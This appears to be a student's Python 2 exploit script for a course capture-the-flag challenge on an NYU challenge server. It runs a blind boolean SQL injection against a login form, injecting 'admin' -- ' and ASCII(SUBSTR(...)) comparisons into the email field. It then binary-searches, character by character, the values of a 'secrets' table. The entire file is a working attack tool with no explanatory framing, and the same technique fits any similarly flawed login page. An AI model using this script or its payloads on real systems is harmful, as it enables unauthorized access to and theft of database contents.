import requests

chalbroker_cookie = dict(CHALBROKER_USER_ID='jm5833')
url = 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?'
#query = '(SELECT table_name FROM information_schema.tables WHERE \
#    table_schema = DATABASE() limit 0,1)'
query = '(SELECT column_name FROM information_schema.columns WHERE \
        table_schema = DATABASE() AND table_name=\'secrets\' limit 1 OFFSET 1)'
query = '(SELECT value FROM logmein.secrets)'
post = {'email' : 'admin\' -- ', 'password' : 'test'}

def sql_eval(char, op, idx):
    sqli = 'admin\' AND ASCII(SUBSTR(' + query + ',' + str(idx) + ',1))' + \
        op + str(char) + '; -- '
    post = {'email' : sqli, 'password' : 'pw'}
    r = requests.post(url, cookies=chalbroker_cookie, data=post)

    if (r.text).find('Fatal error') > -1:
        print 'error'
        raise ValueError('malformed sql') 
    elif (r.text).find('No such user!') > -1:
        print 'false, no char %s%s at idx %d' % (op, chr(char), idx)
#        print 'sqli is currently ' + sqli
        return False
    else:
        print 'true, found char %s%s at idx %d' % (op, chr(char), idx)
        return True

def binsearch(idx):
    first = 33
    last = 126
    found = False
    while(first <= last and not found):
        mid = (first + last) / 2
        if(sql_eval(mid, '>', idx)):
            first = mid + 1
        elif(sql_eval(mid, '=', idx)):
            found = True
        else:
            last = mid - 1
    return (chr(mid), found)

print 'Beginning blind injection...'
idx = 1
result = binsearch(idx)
name = []
while result[1]:
    print('Found %s as valid char' % result[0]) 
    name.append(result[0])
    print 'name is currently %s' % ''.join(name)
    idx += 1
    result = binsearch(idx)
print 'database name is %s' % ''.join(name)
